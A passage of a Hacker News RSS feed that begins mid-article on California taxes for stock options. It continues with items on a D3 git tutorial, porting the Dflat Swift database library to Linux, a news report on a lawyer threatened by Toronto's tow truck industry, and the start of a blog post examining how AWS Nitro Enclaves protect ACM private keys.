src="https://uploads-ssl.webflow.com/5d60577d7a6c5d1ac084a849/5ee78d054a550d0f0039df88_NSO%20Summary.PNG" alt=""></p></figure><h3><strong>ISO Taxation</strong></h3><p>Incentive Stock Options are taxable at exercise and at sale, like NSOs. Unlike NSOs, exercising ISOs <em>may or may not</em> trigger a tax. The ISO <em>spread</em> is included in the Alternative Minimum Tax (AMT) calculation rather than the traditional tax calculation like NSO wage income.&nbsp;</p><p>State and federal AMT calculations are complex and beyond the scope of this essay. As you’ll see on the table at the end of this section, California applies the Allocation Ratio to determine the tax implications of exercising ISOs because CA has its own AMT calculation. If you want to dive down the AMT rabbit hole you can learn more in the <a href="https://www.upstartwealth.com/blog/your-definitive-guide-to-equity-compensation#amt">AMT section</a> of our equity comp guide.</p><p>For now, let’s focus on the decision we know will impact your taxes - selling ISOs.</p><blockquote>EX: As a CA resident, your new job started on June 1, 2018, and you received a grant of 10,000 ISOs at a $1 exercise price. Your ISOs have a 4-year vesting schedule with a 12-month cliff, and shares vest annually thereafter. On June 2, 2019 the FMV is $2 and you exercised the 2,500 ISOs that vest. On May 1, 2020 you move to Austin, TX. On June 1, 2020 another 2,500 ISOs vest and you exercise them on June 3, 2020 when the FMV is $3. What are the tax implications if on July 15, 2020 you sell all 5,000 of your exercised ISOs?</blockquote><p>When an ISO is sold it is either a <em>qualifying disposition </em>or a<em> disqualifying disposition.</em></p><p><em>Qualifying dispositions</em> apply to ISOs sold at least 24 months after the grant date <em>and</em> 12 months from exercise. Qualifying dispositions are taxed at long-term capital gains rates on the difference between the sale price and the exercise price. The 2,500 ISOs exercised in June 2019 meet the 24-month and 12-month thresholds, and would be a qualifying disposition. Since you were a <strong>non-CA resident</strong> at sale, none of the gain is taxable in California.</p><p><em>Disqualifying dispositions</em> apply to ISOs sold within 24 months of grant date <em>or</em> 12 months of exercise. The July 2020 sale was within 12 months of the June 2020 exercise, so the gain on these 2,500 shares is taxed like NSOs because they do not qualify for the special tax treatment. This means the Allocation Ratio comes into play to determine the <em>spread</em> attributable to days worked in CA, which is included as wage income.&nbsp;</p><p>Although there are too many possible scenarios to model all the CA tax implications for ISOs, the table below can help you prepare for questions to ask your tax preparer in advance of your decision to exercise or sell.</p><figure><p><img src="https://uploads-ssl.webflow.com/5d60577d7a6c5d1ac084a849/5ee78de5b214fd3ee43cc897_ISO%20Summary.PNG" alt=""></p></figure><h3><strong>ESPP Taxation</strong></h3><p>ESPP shares are generally included in taxable income when you sell the shares. The <em>spread </em>between the FMV at purchase and the purchase price is included as wages at sale. Similar to ISOs, ESPP sales are either <em>qualifying</em> or <em>disqualifying dispositions</em>. The difference between sale price and FMV at purchase is taxed at capital gains rates based on how long the shares were held.&nbsp;</p><p>If you are a <strong>CA resident</strong> at the beginning of the buying period (think grant date), but a <strong>non-CA resident</strong> when you sell, CA will tax you on a portion of the proceeds based on the number of days you worked in CA during the buying period (think exercise or vest date). But that tax is still only triggered at sale, even if that’s several years after moving out of CA.</p><p>The “days worked” formula is different for ESPP shares than for RSUs. Here, CA only counts the days between the beginning and the end of the buying period (when the shares transfer to you and are eligible for sale).</p><p>The Allocation Ratio based on days worked is multiplied by the wage income from the <em>spread</em>. Any gain or loss beyond that discount would only be taxable in CA if you were a CA resident upon sale.&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5d60577d7a6c5d1ac084a849/5ee78e17920b37ec97af3dcb_ESPP%20Summary.PNG" alt=""></p></figure><h4><strong>Closing Thoughts</strong></h4><p>If you’re thinking …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.upstartwealth.com/blog/will-you-owe-ca-tax-after-you-leave">https://www.upstartwealth.com/blog/will-you-owe-ca-tax-after-you-leave</a></em></p>]]>
            </description>
            <link>https://www.upstartwealth.com/blog/will-you-owe-ca-tax-after-you-leave</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957321</guid>
            <pubDate>Sun, 01 Nov 2020 04:55:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Visualizing Git Concepts with D3]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24957280">thread link</a>) | @gilad
<br/>
October 31, 2020 | https://onlywei.github.io/explain-git-with-d3/ | <a href="https://web.archive.org/web/*/https://onlywei.github.io/explain-git-with-d3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="ExplainGitCommit-Container">
      <p>
        We are going to skip instructing you on how to add your files for commit in this explanation.
        Let's assume you already know how to do that. If you don't, go read some other tutorials.
      </p>
      <p>
        Pretend that you already have your files staged for commit and enter <span>git commit</span>
        as many times as you like in the terminal box.
      </p>
      
    </div>
    <div id="ExplainGitTag-Container">
      <p>
        <span>git tag name</span> will create a new tag named "name".
        Creating tags just creates a new tag pointing to the currently checked out commit.
      </p>
      <p>
        Tags can be deleted using the command <span>git tag -d name</span> (coming soon).
      </p>
      <p>
        Type <span>git commit</span> and <span>git tag</span> commands
        to your hearts desire until you understand this concept.
      </p>
      
    </div>
    <div id="ExplainGitBranch-Container">
      <p>
        <span>git branch name</span> will create a new branch named "name".
        Creating branches just creates a new tag pointing to the currently checked out commit.
      </p>
      <p>
        Branches can be deleted using the command <span>git branch -d name</span>.
      </p>
      <p>
        Type <span>git commit</span> and <span>git branch</span> commands
        to your hearts desire until you understand this concept.
      </p>
      
    </div>
    <div id="ExplainGitCheckout-Container">
      <p>
        <span>git checkout</span> has many uses,
        but the main one is to switch between branches.<br>
        For example, to switch from master branch to dev branch,
        I would type <span>git checkout dev</span>.
        After that, if I do a git commit, notice where it goes. Try it.
      </p>
      <p>
        In addition to checking out branches, you can also checkout individual commits. Try it.<br>
        Make a new commit and then type <span>git checkout bb92e0e</span>
        and see what happens.
      </p>
      <p>
        Type <span>git commit</span>, <span>git branch</span>,
        and <span>git checkout</span> commands to your hearts desire
        until you understand this concept.
      </p>
      
    </div>
    <div id="ExplainGitCheckout-b-Container">
      <p>
        You can combine <span>git branch</span> and <span>git checkout</span>
        into a single command by typing <span>git checkout -b branchname</span>.
        This will create the branch if it does not already exist and immediately check it out.
      </p>
      
    </div>
    <div id="ExplainGitReset-Container">
      <p>
        <span>git reset</span> will move HEAD and the current branch back to wherever
        you specify, abandoning any commits that may be left behind. This is useful to undo a commit
        that you no longer need.
      </p>
      <p>
        This command is normally used with one of three flags: "--soft", "--mixed", and "--hard".
        The soft and mixed flags deal with what to do with the work that was inside the commit after
        you reset, and you can read about it <a href="http://git-scm.com/2011/07/11/reset.html">here</a>.
        Since this visualization cannot graphically display that work, only the "--hard" flag will work
        on this site.
      </p>
      <p>
        The ref "HEAD^" is usually used together with this command. "HEAD^" means "the commit right
        before HEAD. "HEAD^^" means "two commits before HEAD", and so on.
      </p>
      <p>
        Note that you must <b>never</b> use <span>git reset</span> to abandon commits
        that have already been pushed and merged into the origin. This can cause your local repository
        to become out of sync with the origin. Don't do it unless you really know what you're doing.
      </p>
      
    </div>
    <div id="ExplainGitRevert-Container">
      <p>
        To undo commits that have already been pushed and shared with the team, we cannot use the
        <span>git reset</span> command. Instead, we have to use <span>git revert</span>.
      </p>
      <p>
        <span>git revert</span> will create a new commit that will undo all of the work that
        was done in the commit you want to revert.
      </p>
      
    </div>
    <div id="ExplainGitMerge-Container">
      <p>
        <span>git merge</span> will create a new commit with two parents. The resulting
        commit snapshot will have the all of the work that has been done in both branches.
      </p>
      <p>
        If there was no divergence between the two commits, git will do a "fast-forward" method merge.<br>
        To see this happen, checkout the 'ff' branch and then type <span>git merge dev</span>.
      </p>
      
    </div>
    <div id="ExplainGitRebase-Container">
      <p>
        <span>git rebase</span> will take the commits on this branch and "move" them so that their
        new "base" is at the point you specify.
      </p>
      <p>
        You should pay close attention to the commit IDs of the circles as they move when you do this exercise.
      </p>
      <p>
        The reason I put "move" in quotations because this process actually generates brand new commits with
        completely different IDs than the old commits, and leaves the old commits where they were. For this reason,
        you never want to rebase commits that have already been shared with the team you are working with.
      </p>
      
    </div>
    <div id="ExplainGitFetch-Container">
      <p>
        <span>git fetch</span> will update all of the "remote tracking branches" in your local repository.
        Remote tracking branches are tagged in grey.
      </p>
      
    </div>
    <div id="ExplainGitPull-Container">
      <p>
        A <span>git pull</span> is a two step process that first does a <span>git fetch</span>,
        and then does a <span>git merge</span> of the remote tracking branch associated with your current branch.
        If you have no current branch, the process will stop after fetching.
      </p>
      <p>
        If the argument "--rebase" was given by typing <span>git pull --rebase</span>, the second step of
        pull process will be a rebase instead of a merge. This can be set to the default behavior by configuration by typing:
        <span>git config branch.BRANCHNAME.rebase true</span>.
      </p>
      
    </div>
    <div id="ExplainGitPush-Container">
      <p>
        A <span>git push</span> will find the commits you have on your local branch that the corresponding branch
        on the origin server does not have, and send them to the remote repository.
      </p>
      <p>
        By default, all pushes must cause a fast-forward merge on the remote repository. If there is any divergence between
        your local branch and the remote branch, your push will be rejected. In this scenario, you need to pull first and then
        you will be able to push again.
      </p>
      
    </div>
    <div id="ExplainGitClean-Container">
      <p>
        One simple example of the use of <span>git reset</span> is to completely restore your local repository
        state to that of the origin.<br>
        You can do so by typing <span>git reset origin/master</span>.
      </p>
      <p>
        Note that this won't delete untracked files, you will have to delete those separately with
        the command <span>git clean -df</span>.
      </p>
      
    </div>
    <div id="ExplainGitFetchRebase-Container">
      <p>
        Below is a situation in which you are working in a local branch that is all your own. You want to receive the latest code
        from the origin server's master branch. To update your local branch, you can do it without having to switch branches!
      </p>
      <p>
        First do a <span>git fetch</span>, then type <span>git rebase origin/master</span>!
      </p>
      
    </div>
    <div id="ExplainGitDeleteBranches-Container">
      <p>
        <span>git branch -d</span> is used to delete branches.
        I have pre-created a bunch of branches for you to delete in the playground below.
        Have at it.
      </p>
      
    </div>
    <div id="ExplainGitFree-Container">
      <p>
        Do whatever you want in this free playground.
      </p>
      
    </div>
  </div></div>]]>
            </description>
            <link>https://onlywei.github.io/explain-git-with-d3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957280</guid>
            <pubDate>Sun, 01 Nov 2020 04:43:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Core Data Alternative Crossed Platform to Linux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957225">thread link</a>) | @todsacerdoti
<br/>
October 31, 2020 | https://liuliu.me/eyes/a-core-data-alternative-crossed-platform-to-linux/ | <a href="https://web.archive.org/web/*/https://liuliu.me/eyes/a-core-data-alternative-crossed-platform-to-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the past a few months, I’ve worked on <a href="https://dflat.io/">Dflat</a>, among <a href="https://liuliu.me/eyes/migrating-ios-project-to-bazel-a-real-world-experience/">many</a> <a href="https://liuliu.me/eyes/loading-csv-file-at-the-speed-limit-of-the-nvme-storage/">other</a> <a href="https://github.com/liuliu/s4nnc/">things</a>. The theme is to explore a workflow using <a href="https://bazel.build/">Bazel</a> as the build and deployment system, and <a href="https://swift.org/">Swift</a> as the main language for data exploration, modeling, and production system.</p>

<p>Dflat appears to be an outlier for this theme. I simply have the urge to implement what I considered to be the one-true-way of doing structured data persistence on mobile, and to share it with the wider community. It was designed squarely for mobile data persistence needs, much like Core Data before. Case in point, the backing data engine has always been SQLite.</p>

<p>Up until recently. As I dug deeper in this <em>Swift for data exploration, modeling and production system</em> theme, it is increasingly likely that I need some data persistence mechanism. It may not be as fancy as for mobile, where I can observe changes and rely on one-way data flow to update UI. But it is darned nice to specify schema explicitly, persisting to a proper database, and don’t worry about schema upgrade at all.</p>

<p>For the past couple of the days, I’ve worked on porting <a href="https://swiftpackageindex.com/liuliu/dflat">Dflat to Linux</a>. With some minimal work (mostly around <a href="https://github.com/liuliu/dflat/blob/unstable/external/sqlite3.BUILD#L13">figuring out the right SQLite compilation flags</a> and moving code from one place to another to make Swift Linux runtime happy), it is done. I’ve also added some <a href="https://github.com/liuliu/dflat/blob/unstable/dflat.bzl#L33">Bazel rules</a> for code generation, so if you use Bazel, Dflat would work wonders out of the box.</p>

<p>What does this mean? If you use <a href="https://swift.org/download/#releases">Swift in Linux</a>, you don’t need to interact with SQLite directly any more. Dflat handles SQLite concurrency control, proper SQLite configuration, strongly-typed queries, data schema management, transparent (and read-only) backward compatible upgrades. Beyond that, it offers query subscription so for a long-running program, you can simply subscribe to a query and update based on the changed results.</p>

<h3 id="an-example">An Example</h3>

<p>If you happen to do Bazel + Swift on Linux, using Dflat is simple. In <code>WORKSPACE</code> file, add following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre><span>git_repository</span><span>(</span>
    <span>name</span> <span>=</span> <span>"dflat"</span><span>,</span>
    <span>remote</span> <span>=</span> <span>"https://github.com/liuliu/dflat.git"</span><span>,</span>
    <span>commit</span> <span>=</span> <span>"3dc11274e8c466dd28ee35cdd04e84ddf7d420bc"</span><span>,</span>
    <span>shallow_since</span> <span>=</span> <span>"1604185591 -0400"</span>
<span>)</span>
<span>load</span><span>(</span><span>"@dflat//:deps.bzl"</span><span>,</span> <span>"dflat_deps"</span><span>)</span>
<span>dflat_deps</span><span>()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>For the binary that requires to persist some user settings, you can start to edit the schema file: <code>user.fbs</code>.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>table User {
    username: string (primary);
    accessTime: double;
}
root_type User;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In your <code>BUILD.bazel</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>load</span><span>(</span><span>"@dflat//:dflat.bzl"</span><span>,</span> <span>"dflatc"</span><span>)</span>
<span>dflatc</span><span>(</span>
    <span>name</span> <span>=</span> <span>"user_schema"</span><span>,</span>
    <span>src</span> <span>=</span> <span>"user.fbs"</span>
<span>)</span>
<span>swift_binary</span><span>(</span>
    <span>name</span> <span>=</span> <span>"main"</span><span>,</span>
    <span>srcs</span> <span>=</span> <span>[</span><span>"main.swift"</span><span>,</span> <span>":user_schema"</span><span>],</span>
    <span>deps</span> <span>=</span> <span>[</span>
        <span>"@dflat//:SQLiteDflat"</span>
    <span>]</span>
<span>)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Use them in <code>main.swift</code> file:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
</pre></td><td><pre><span>import</span> <span>Dflat</span>
<span>import</span> <span>SQLiteDflat</span>
<span>let</span> <span>workspace</span> <span>=</span> <span>SQLiteWorkspace</span><span>(</span><span>filePath</span><span>:</span> <span>"main.db"</span><span>,</span> <span>fileProtectionLevel</span><span>:</span> <span>.</span><span>noProtection</span><span>)</span>
<span>workspace</span><span>.</span><span>performChanges</span><span>([</span><span>User</span><span>.</span><span>self</span><span>],</span> <span>changesHandler</span><span>:</span> <span>{</span> <span>txnContext</span> <span>in</span>
  <span>let</span> <span>creationRequest</span> <span>=</span> <span>UserChangeRequest</span><span>.</span><span>creationRequest</span><span>()</span>
  <span>creationRequest</span><span>.</span><span>username</span> <span>=</span> <span>"lliu"</span>
  <span>creationRequest</span><span>.</span><span>accessTime</span> <span>=</span> <span>Date</span><span>()</span><span>.</span><span>timeIntervalSince1970</span>
  <span>txnContext</span><span>.</span><span>try</span><span>(</span><span>submit</span><span>:</span> <span>creationRequest</span><span>)</span>
<span>})</span>
<span>workspace</span><span>.</span><span>shutdown</span><span>()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Later read the data and update the <code>accessTime</code>:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>import</span> <span>Dflat</span>
<span>import</span> <span>SQLiteDflat</span>
<span>let</span> <span>workspace</span> <span>=</span> <span>SQLiteWorkspace</span><span>(</span><span>filePath</span><span>:</span> <span>"main.db"</span><span>,</span> <span>fileProtectionLevel</span><span>:</span> <span>.</span><span>noProtection</span><span>)</span>
<span>let</span> <span>result</span> <span>=</span> <span>workspace</span><span>.</span><span>fetch</span><span>(</span><span>for</span><span>:</span> <span>User</span><span>.</span><span>self</span><span>)</span><span>.</span><span>where</span><span>(</span><span>User</span><span>.</span><span>username</span> <span>==</span> <span>"lliu"</span><span>)</span>
<span>let</span> <span>user</span> <span>=</span> <span>result</span><span>[</span><span>0</span><span>]</span>
<span>print</span><span>(</span><span>user</span><span>.</span><span>accessTime</span><span>)</span>
<span>workspace</span><span>.</span><span>performChanges</span><span>([</span><span>User</span><span>.</span><span>self</span><span>],</span> <span>changesHandler</span><span>:</span> <span>{</span> <span>txnContext</span> <span>in</span>
  <span>let</span> <span>changeRequest</span> <span>=</span> <span>UserChangeRequest</span><span>.</span><span>changeRequest</span><span>(</span><span>user</span><span>)</span>
  <span>changeRequest</span><span>.</span><span>accessTime</span> <span>=</span> <span>Date</span><span>()</span><span>.</span><span>timeIntervalSince1970</span>
  <span>txnContext</span><span>.</span><span>try</span><span>(</span><span>submit</span><span>:</span> <span>changeRequest</span><span>)</span>
<span>})</span>
<span>workspace</span><span>.</span><span>shutdown</span><span>()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="iphone-12-pro-vs-threadripper-3970x">iPhone 12 Pro v.s. Threadripper 3970x</h3>

<p>Dflat benchmark is now available on both iPhone 12 Pro and TR 3970x. It enables some quick apple-to-orange comparisons.</p>

<p>The iPhone 12 Pro benchmark followed exactly <a href="https://dflat.io/benchmark/">the previous benchmark</a>.</p>

<p>The Linux benchmark runs with <code>bazel run --compliation_mode=opt app:BenchmarksBin</code>.</p>

<table>
  <thead>
    <tr>
      <th>Work</th>
      <th>iPhone 12 Pro</th>
      <th>TR 3970x</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Insert 10,000</td>
      <td>0.072s</td>
      <td>0.054s</td>
    </tr>
    <tr>
      <td>Fetch 3,334</td>
      <td>0.004s</td>
      <td>0.006s</td>
    </tr>
    <tr>
      <td>Update 10,000</td>
      <td>0.085s</td>
      <td>0.066s</td>
    </tr>
    <tr>
      <td>4-Thread Insert 40,000</td>
      <td>0.452s</td>
      <td>0.219s</td>
    </tr>
    <tr>
      <td>4-Thread Delete 40,000</td>
      <td>0.289s</td>
      <td>0.193s</td>
    </tr>
    <tr>
      <td>10,000 Updates to 1,000 Subscriptions*</td>
      <td>3.249s</td>
      <td>3.356s</td>
    </tr>
  </tbody>
</table>

<p>Each subscribed query contains roughly 1,000 objects.</p>

<h3 id="beyond-server--client-relationship">Beyond Server / Client Relationship</h3>

<p>The <a href="https://github.com/liuliu/dflat/blob/unstable/BUILD#L30">Bazel</a> and <a href="https://github.com/liuliu/dflat/blob/unstable/Package.swift#L21">Swift Package Manager</a> version of Dflat for Linux packaged <a href="https://swift.org/download/#releases">SQLite 3.33.0</a> in source-form. It enables some interesting ideas. With a little bit more work, we may as well compile Dflat to run <a href="https://swiftwasm.org/">in WebAssembly</a>. Wasm can be the ideal form to be deployed at edge nodes. When worked on Snapchat app in the past, I’ve long theorized that we could deploy peering nodes for customers, and the server / device communication can be replaced with server / peering node / device with peering node and device <a href="https://www.sqlite.org/c3ref/update_hook.html">syncing materialized views incrementally</a> through some kind of <a href="https://dev.mysql.com/doc/internals/en/binary-log-overview.html">binlog</a> mechanism. It looks like this kind of architecture can be done, if we have some kind of uniformity between peering nodes and mobile devices.</p>

<h3 id="beyond-sqlite">Beyond SQLite</h3>

<p>Even Dflat now supports Linux, it doesn’t mean this is a server software. Advanced features such as <a href="https://dflat.io/runtime-api/#data-subscription">live query subscription</a> can only happen if you go through a single <code>Workspace</code> instance. To make Dflat work in Linux, we actually deepened the SQLite and Dflat relationship by promoting some code from SQLiteDflat to Dflat.</p>

<p>This doesn’t mean we cannot change the backing data engine. Dflat could potentially help server-grade databases such as PostgreSQL in other ways. <a href="https://dflat.io/notes/upgrade/">The smooth schema evolution</a> would be an interesting way to formalize what <a href="https://eng.uber.com/schemaless-part-one-mysql-datastore/">people like Uber already did</a>.</p>

<p>A server-grade database such as <a href="https://www.postgresql.org/docs/current/sql-listen.html">PostgreSQL could also potentially support live query subscription</a> across many <code>Workspace</code> instances with some substantial redesign of Dflat internals.</p>

<h3 id="exploration-ahead">Exploration Ahead</h3>

<p>Supporting Dflat on Linux enables some interesting design space exploration (for one, I need to change <code>Workspace.shutdown()</code> semantics to better work with short-lived command-line programs). Whether a mobile-focused database would work for a variety of Linux-based workflows is a question without definitive answer still. I would continue my exploration in the meantime and report back on any substantial findings.</p>
</div></div>]]>
            </description>
            <link>https://liuliu.me/eyes/a-core-data-alternative-crossed-platform-to-linux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957225</guid>
            <pubDate>Sun, 01 Nov 2020 04:28:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Toronto-area lawyer had to flee Canada after taking on the tow truck industry]]>
            </title>
            <description>
<![CDATA[
Score 200 | Comments 87 (<a href="https://news.ycombinator.com/item?id=24957200">thread link</a>) | @walterbell
<br/>
October 31, 2020 | https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>TORONTO -- 
	Lisa Carr never thought her work would lead to armed threats, a firebombing, a shooting and a conspiracy to kill her.</p>
<p>
	The Carr Law office is in a nondescript strip mall in Vaughan, Ont., north of Toronto. It’s closed now, after the litigation lawyer says police told her they could no longer protect her.</p>
<p>
	She was shuttled to another country where she spent five long months in hiding. Carr has never before told her story, but agreed to meet for an interview as part of a W5 investigation into the shady underbelly of an industry that forced her to give up her business and almost cost her, her life: The tow truck industry.</p>
<p>
	Over the last number of years, criminal elements have been battling for lucrative control of the major highways around the Toronto area. It has resulted in more than 50 arsons, multiple shootings and at least four murders.</p>
<p>
	So why is there so much violence over a couple of hundred-dollar tows at the side of the road? Because that one tow can net tens of thousands of dollars.</p>
<p>
	Here’s how it works: The tow truck driver gets a kickback from an unscrupulous auto body shop, which then submits wildly inflated repair fees to an insurance company.</p>
<p>
	<img alt="york police" src="https://www.ctvnews.ca/polopoly_fs/1.4954903!/httpImage/image.jpg_gen/derivatives/landscape_960/image.jpg"></p>
<p>
	The insurance industry estimates that fake repair bills tally up to $2 billion a year in Canada. And that’s why Carr was in the crosshairs. She was hired by an insurance company to challenge bogus claims.</p>
<p>
	Over the course of a number of months, Carr’s law firm was the target of increasingly violent attacks. First a firebombing and then her office was set on fire.</p>
<p>
	Months later, in broad daylight, a colleague leaving work had a gun put to her head and was told, “Stop suing our friends.” Shortly after that, again in broad daylight, someone opened fire through the front door of the busy office.</p>
<p>
	Carr says it is incredible no one was struck by the flurry of bullets.</p>
<p>
	“I looked down the hall and I saw my receptionist on her hands and knees surrounded by glass. And one of the other girls came running at me saying, ‘Shots fired, shots fired. Call 911.’”</p>
<p>
	While the violence surrounding the tow truck industry has made headlines in the Greater Toronto Area, the story that has never been told is that York Regional Police (YRP) uncovered a plot to kill Carr.</p>
<p>
	It was such a credible threat that they gave her an hour to pack up her belongings and leave her home. Carr and her husband were then whisked out of the country and spent five months in hiding.</p>
<p>
	Three separate police services – YRP, Toronto Police Service and Ontario Provincial Police – joined forces to launch Project Platinum to investigate the violence associated with the tow truck industry.</p>
<p>
	They carried out a series of raids this past spring, which netted dozens of high-powered weapons and led to the arrests of 35 people who face almost 500 charges, including the attempted murder of Carr.</p>
<p>
	<img alt="weapon" src="https://www.ctvnews.ca/polopoly_fs/1.4954983!/httpImage/image.jpg_gen/derivatives/landscape_960/image.jpg"></p>
<p>
	Now back in Canada, Carr says police have told her she is likely no longer in danger, but with one caveat.</p>
<p>
	“The police said we believe the risk is low. As long as you don't go back to work, as long as you don't restart the firm,” she says.</p>
<p>
	“So they have effectively ended my career. We lost everything. They won.”</p>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957200</guid>
            <pubDate>Sun, 01 Nov 2020 04:20:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ACM for Nitro Enclaves – How Secure Are They?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957128">thread link</a>) | @transpute
<br/>
October 31, 2020 | https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they | <a href="https://web.archive.org/web/*/https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The new EC2 Nitro Enclaves enable virtual machines to process private data without exposing its encryption key to the parent instance. In this post we will explore how Nitro Enclaves are used to securely process private keys stored in ACM.</p>
<p>This is part 2 in a two-part article. In the first part we review why Nitro Enclaves matter and how they can benefit your sensitive workloads: <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">ACM for Nitro Enclaves - It’s a Big Deal</a>.</p>
<h3>Overview</h3>
<p>This article follows the steps outlined in AWS’ documentation: <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html">AWS Certificate Manager for Nitro Enclaves</a>. In their article, AWS builds the following architecture.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/4volL2Vsj6GH8kyvLASvYq/ceb73ac4e50f8779794628e56900f2b7/refarch.png?fit=scale&amp;w=1330" alt="ACM Reference Architecture"></p>
<p>As discussed in <a rel="noopener noreferrer" href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-its-a-big-deal">part 1</a>, it’s essential for private keys stored in ACM to never be exposed. As such, it’s interesting to see how AWS keeps these private keys secure, while still hosting them on your (relatively insecure) EC2 instance. The answer, of course, lies in the new <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">Nitro Enclaves</a>.</p>
<p>The two main topics for this post are:</p>
<ul>
<li>How are private keys transmitted (and can we intercept them)?</li>
<li>How are permissions assigned to the Nitro Enclave (and can we assume them)?</li>
</ul>
<h3>Launching an EC2 instance</h3>
<p>The first step is to launch an Enclave-enabled EC2 instance. From the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave.html#nitro-enclave-reqs">requirements</a> we learn this can be any Nitro instance with an Intel or AMD processor. Further digging shows that the minimum size is an <code>m5a.xlarge</code>.</p>
<p>The operating system needs to be Linux. On Amazon Linux 2 the Nitro CLI is available in a yum repository. Installation instructions for other operating systems can be found on the Nitro Enclaves CLI <a rel="noopener noreferrer" href="https://github.com/aws/aws-nitro-enclaves-cli">Github page</a>.</p>
<p>Amazon has provided ready-to-go AMIs with NginX and the Nitro CLI pre-installed, so for this article we will use those. We will assign an IAM role with admin permissions to the instance so we won’t be limited in exploring access methods.</p>
<p>With the pre-build AMI deployed in a default VPC and an IAM role with admin permissions, our current architecture looks like this:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/4HFodRfnVjsleJ2YI6pVgg/66fce88c7b5ea3ba5234ae1bdee35d5e/deployment-1.png?fit=scale&amp;w=1330" alt="Deployment 1"></p>
<h3>Creating an ACM certificate</h3>
<p>ACM certificates are free, but we do need a valid domain name. I’ve once purchased <code>vpcdemo.net</code>, so that’s what I will use for this article.</p>
<p>After we’ve moved through the steps of requesting a certificate, it shows as <code>Issued</code> and has an ARN. We will need this ARN in the next step.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/5Oxxf6wRYgkMm7QgYxHyq/6933f73ec20c723ed0bd6a790e43b9d9/valid_cert.jpg?fit=scale&amp;w=1330" alt="Valid Certificate"></p>
<h3>Associating the IAM role with the certificate</h3>
<p>This is where it gets interesting. The <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html#role-cert">next step</a> in the process is to “Associate the role with the ACM certificate”.</p>
<p>The command to achieve this is <code>aws ec2 --region [region] associate-enclave-certificate-iam-role --certificate-arn [certificate_ARN] --role-arn [role_ARN]</code></p>
<p>This means we’re telling ACM that our EC2 instance role is allowed to access this certificate and private key. But we haven’t created a Nitro Enclave yet, and this role is assigned to an EC2 instance <strong>we</strong> control. Does that mean we will be able to access the private key from our instance? Let’s find out.</p>
<p>Running the command above yields the following output:</p>
<pre><code>aws ec2 --region eu-central-1 associate-enclave-certificate-iam-role --certificate-arn arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 --role-arn arn:aws:iam::123412341234:role/admin-role
{
    "EncryptionKmsKeyId": "cb8e3d89-cd82-4560-867c-641c0008fab2", 
    "CertificateS3BucketName": "aws-ec2-enclave-certificate-eu-central-1-prod", 
    "CertificateS3ObjectKey": "arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103"
}
</code></pre>
<p>This output obviously refers to three things:</p>
<ul>
<li>An S3 bucket (owned by AWS)</li>
<li>An S3 object (that likely contains our certificate and private key)</li>
<li>A KMS key (that is likely used to decrypt sensitive data)</li>
</ul>
